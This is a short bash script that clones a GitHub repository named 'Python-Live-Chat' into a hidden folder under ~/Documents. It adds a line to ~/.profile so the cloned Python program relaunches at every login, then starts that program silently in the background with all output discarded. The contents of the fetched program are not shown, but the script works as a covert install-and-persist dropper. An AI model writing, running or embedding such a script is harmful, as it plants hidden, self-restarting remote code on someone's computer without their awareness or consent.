#!/bin/bash
git clone https://github.com/MaitreRenard18/Python-Live-Chat ~/Documents/.thnr
echo "python ~/Documents/.thnr/main.pyw true &" >> ~/.profile
nohup python ~/Documents/.thnr/main.pyw true > /dev/null 2>&1 &
